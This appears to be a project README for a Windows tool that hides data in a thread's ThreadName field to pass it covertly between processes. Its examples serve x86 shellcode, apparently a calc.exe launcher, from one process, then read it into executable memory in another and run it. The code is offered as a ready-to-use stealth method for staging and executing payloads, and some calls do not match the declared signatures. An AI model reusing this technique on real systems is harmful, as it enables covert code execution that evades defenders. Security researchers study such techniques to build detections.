# 🕵️ dearg-thread-ipc-stealth
A novel technique to communicate between threads using the standard ETHREAD structure. This is the wrapper to use the technique, using `ThreadName` as a buffer to talk between processes, with just the need for a `HANDLE` to the thread.

The technique relies on the fact that we can modify the `ThreadName` member when the `ETHREAD` structure. The `ETHREAD` structure simply contains information about a thread, and is stored in kernel space. We can fetch information about a thread using the `NtQueryInformationThread` system call, or the friendler user-mode API `GetThreadInformation`, and subsequently set information about a thread using `NtSetInformationThread`, and `SetInformationThread`. I've attempted to make this technique follow the model of client <-> server as much as possible, where the client is fetching whatever buffer from another thread, and the server hosting it.


## Usage
There are two main exported methods, one to read from another thread, and another to serve the content to another thread. All of the return values are custom, and set by the upon operation success or failure.
```C
DEARG_STATUS
dearg_read(
	_In_ HANDLE hThread,
	_Out_ PDEARG_HEADER pHdr,
	_Out_ PBYTE pbDataOut
);

DEARG_STATUS
dearg_serve(
	_In_ HANDLE hThread,
	_In_ DEARG_FLAGS dFlags,
	_In_ PDEARG_HEADER pHdr,
	_In_ PBYTE pbBuffer,
	_In_ UINT16 u16Len
);
```

### Server Example
```C
int main(int argc, char** argv)
{
	BYTE bShellcode[] = \
		"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
		"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
		"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
		"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
		"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
		"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
		"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
		"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
		"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
		"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
		"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
		"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
		"\x52\xff\xd0";

	// initialise the header
	DEARG_HEADER dHdr;
	if (!dearg_init_hdr(&dHdr))
	{
		return 0;
	}

	// attempt to serve the shellcode
	DEARG_STATUS dStatus = dearg_serve(GetCurrentThread(), DEARG_READ | DEARG_WRITE, &dHdr, bShellcode, sizeof(bShellcode));
	if (dStatus != DSERVE_OK)
	{
		switch (dStatus)
		{
		case DSERVE_ERROR_KEY:
			puts("failed to find a suitable key");
			break;

		case DSERVE_ERROR_SET:
			puts("failed to set the thread name");
			break;

		case DSERVE_ERROR_ALLOC:
			puts("a memory allocation failure occured");
			break;

		case DSERVE_INVALID_PARAMS:
			puts("the parameters were invalid");
			break;
		}

		return 0;
	}

	printf("Serving %d bytes of content on thread ID %d using key 0x%X\n", sizeof(bShellcode), GetCurrentThreadId(), dHdr.Key);
	return 1;
}
```

### Client Example
```C
HANDLE hThread = OpenThread(THREAD_QUERY_LIMITED_INFORMATION, FALSE, 1337);
if (hThread == INVALID_HANDLE_VALUE)
{
	return FALSE;
}

DEARG_HEADER dHdr;
RtlSecureZeroMemory(&dHdr, sizeof(DEARG_HEADER));

// first, get the buffer size by heading the header
if (dearg_read(hThread, &dHdr, NULL, 0) != DSERVE_NO_DATA_OUT) 
{
	return FALSE;
}

// allocate the executable memory with the size from the header
LPVOID lpMem = VirtualAlloc(NULL, dHdr.u16Size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
if (lpMem == NULL)
{
	return FALSE;
}

// read in the data
// first, get the buffer size by heading the header
if (dearg_read(hThread, &dHdr, lpMem) != DSERVE_OK) 
{
	return FALSE;
}

// execute the shellcode
((VOID(*)())lpMem)();
```